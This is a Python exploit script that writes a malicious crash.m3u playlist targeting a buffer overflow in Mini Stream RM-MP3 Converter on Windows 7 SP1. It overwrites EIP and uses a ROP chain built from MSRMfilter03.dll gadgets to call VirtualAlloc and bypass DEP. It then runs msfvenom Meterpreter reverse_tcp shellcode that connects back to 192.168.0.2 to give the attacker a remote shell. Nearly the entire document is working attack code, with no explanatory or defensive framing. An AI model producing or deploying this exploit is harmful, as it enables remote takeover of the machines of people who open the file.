import sys
import struct


#software: mini stream rm mp3 converter
#os: Win 7 SP1

#kernel32.virtualalloc at 0x10032078 [MSRMfilter03.dll]
#EIP: 0x10019C60 Random RETN



#  LPVOID VirtualAlloc(      >>> pointer to VirtualAlloc()
#    LPVOID lpAddress,       >>> Exec to ESP 
#    SIZE_T dwSize,          >>> 0x1
#    DWORD  flAllocationType, >>> 0x1000
#    DWORD  flProtect        >>> 0x40
#  );

#   Register setup for VirtualAlloc()
#
#   EAX = NOP (0x90909090)
#   ECX = flProtect (0x40)
#   EDX = flAllocationType (0x1000)
#   EBX = dwSize
#   ESP = lpAddress (auto)
#   EBP = ptr to jmp esp
#   ESI = ptr to VirtualAlloc()
#   EDI = ROP NOP (RETN)

#ROP CHAIN NOT OPTIMIZED

chain = struct.pack('<L',0x10029822) # pop eax
chain += struct.pack('<L',0x10032078) # kernel32.virtualalloc()
chain += struct.pack('<L',0x1002e0c8) # mov eac,dword ptr ds:[eax] 
chain += struct.pack ('<L',0x1001a788) #push eax # pop esi  (VirtualAlloc >>> ESI)
chain += struct.pack ('<L',0x41414141) #filler
chain += struct.pack ('<L',0x41414141) #filler
chain += struct.pack ('<L',0x41414141) #filler
chain += struct.pack('<L',0x10013b1c) # POP EBX # RETN
chain += struct.pack('<L',0xffffffff) # will be 0x1
chain += struct.pack('<L',0x100319d3) # INC EBX # FPATAN # RETN
chain += struct.pack('<L',0x100319d3) # INC EBX # FPATAN # RETN
                                      #dwSize (0x1) -> EBX
chain += struct.pack('<L',0x10023ec7) #pop edi
chain += struct.pack('<L',0x1001c121) #RETN rop nop
chain += struct.pack('<L',0x100143b6) #pop ecx
chain += struct.pack('<L',0xffffffff) 
chain += struct.pack('<L',0x1002dd3e) #inc ecx # and eax,8 # RETN
chain += struct.pack('<L',0x1002dd3e) 
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e) 
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e) 
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e) 
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e) 
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e) 
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e) 
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e) 
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e) 
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e) 
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e) 
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e) 
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e) 
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e) 
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e) 
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1002dd3e)
chain += struct.pack('<L',0x1003fb3f) # MOV EDX,E58B0001 # POP EBP # RETN
chain += struct.pack('<L',0x41414141) # padding for POP EBP
chain += struct.pack('<L',0x10013b1c) # POP EBX # RETN
chain += struct.pack('<L',0x1A750FFF) # ebx+edx => 0x1000 flAllocationType
chain += struct.pack('<L',0x10029f3e) # ADD EDX,EBX # POP EBX # RETN 10
chain += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
chain += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
chain += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
chain += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
chain += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
chain += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
                                      #flAllocationType (0x1000) -> EDX
chain += struct.pack('<L',0x100532ed)   # POP EBP # RETN
chain += struct.pack('<L',0x100371f5)   #CALL ESP
                                        #CALL ESP >>> EBP
chain += struct.pack('<L',0x10030361)   #POP EAX # RETN
chain += struct.pack('<L',0x90909090)   # NOP
                                        #NOP -> EAX
chain += struct.pack('<L',0x10014720)   # PUSHAD # RETN

#shellcode generated with msfvenom (windows/meterpreter/reverse_tcp)

buf =  ""
buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
buf += "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8\xff"
buf += "\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80"
buf += "\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x00\x02\x68\x02"
buf += "\x00\x10\xe1\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
buf += "\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68"
buf += "\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08"
buf += "\x75\xec\xe8\x67\x00\x00\x00\x6a\x00\x6a\x04\x56\x57"
buf += "\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b"
buf += "\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58"
buf += "\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"
buf += "\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68"
buf += "\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff"
buf += "\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c"
buf += "\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01"
buf += "\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00"
buf += "\x53\xff\xd5"
 


crash = "http://." + "A"*17416 + "\x60\x9c\x01\x10" +chain +buf+"C"* (7572-len(chain+buf))
file = 'crash.m3u'

write = open (file,'w')
write.write(crash)
write.close()
